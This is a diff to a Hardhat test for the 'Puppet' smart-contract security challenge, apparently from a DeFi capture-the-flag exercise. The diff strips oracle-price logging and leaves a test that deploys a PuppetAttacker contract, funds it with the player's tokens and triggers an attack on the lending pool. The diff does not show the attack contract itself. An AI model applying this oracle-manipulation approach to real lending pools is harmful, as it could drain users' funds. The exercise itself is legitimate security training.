@@ -94,17 +94,10 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        const priceBefore = await lendingPool._computeOraclePrice();
-        console.log("priceBefore = ", priceBefore);
-
         const puppetAttackerFactory = await ethers.getContractFactory("PuppetAttacker", deployer);
         const puppetAttacker = await puppetAttackerFactory.deploy(player.address, token.address, uniswapExchange.address, lendingPool.address);
         await token.connect(player).transfer(puppetAttacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
         puppetAttacker.attack({value: 11n * 10n ** 18n});
-
-        const priceAfter = await lendingPool._computeOraclePrice();
-        
-        console.log("Pool price: ", priceBefore, priceAfter);
     });
 
     after(async function () {
